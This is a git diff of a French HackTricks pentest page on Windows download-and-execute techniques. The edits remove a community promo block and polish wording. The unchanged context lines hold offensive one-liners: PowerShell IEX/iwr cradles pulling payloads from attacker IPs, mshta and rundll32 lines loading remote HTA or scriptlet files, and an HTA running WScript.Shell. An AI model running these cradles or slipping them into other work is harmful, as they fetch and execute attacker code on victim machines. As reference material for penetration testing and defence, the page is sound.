@@ -15,14 +15,6 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 ## Lolbas
 
 La page [lolbas-project.github.io](https://lolbas-project.github.io/) est pour Windows comme [https://gtfobins.github.io/](https://gtfobins.github.io/) l'est pour Linux.\
@@ -102,7 +94,7 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 Processus effectuant un appel réseau : **powershell.exe**\
-Charge utile écrite sur le disque : **NON** (_du moins nulle part où je pourrais trouver en utilisant procmon !_ )
+Charge utile écrite sur le disque : **NON** (_du moins nulle part où je pourrais trouver en utilisant procmon !_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
@@ -137,7 +129,7 @@ mshta \\webdavserver\folder\payload.hta
 
 #### exemple hta
 
-[**Ici**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
+[**À partir d'ici**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
 ```xml
 <html>
 <head>
@@ -154,7 +146,7 @@ new ActiveXObject('WScript.Shell').Run(c);
 ```
 #### **mshta - sct**
 
-[**De ici**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+[**D'ici**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 ```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -462,7 +454,7 @@ Démarrez msfconsole avec la ressource créée :
 ```
 msfconsole -r unicorn.rc
 ```
-Démarrez un serveur web servant le fichier _powershell\_attack.txt_ et exécutez-le chez la victime :
+Démarrez un serveur web servant le fichier _powershell\_attack.txt_ et exécutez-le sur la victime :
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -483,12 +475,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) console PS avec quelques modul
 * [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
-​
-**Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
 Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
@@ -498,7 +485,7 @@ Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt=
 
 <summary>Soutenir HackTricks</summary>
 
-* Vérifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
